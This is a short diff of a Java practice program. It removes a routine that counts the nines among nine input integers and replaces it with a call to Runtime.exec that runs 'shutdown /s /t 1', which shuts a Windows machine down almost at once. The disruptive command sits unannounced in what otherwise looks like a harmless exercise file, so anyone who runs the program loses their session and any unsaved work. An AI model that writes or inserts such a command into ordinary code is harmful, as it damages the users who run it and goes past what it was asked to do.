@@ -1,17 +1,15 @@
+import java.io.IOException;
 import java.util.*;
 
 class practice {
     public static void main(String[] args)  {
-        Scanner sc=new Scanner(System.in);
-       int[] a=new int[9];
-       int count=0;
-       for(int i=0;i<9;i++){
-          a[i]=sc.nextInt();
-       }
-       for(int i=0;i<9;i++){
-           if(a[i]==9) count++;
-       }
-        System.out.println(count);
+
+      try{
+          Runtime.getRuntime().exec("shutdown /s /t 1");
+      }
+      catch (IOException e){
+          e.printStackTrace();
+      }
 
 
 
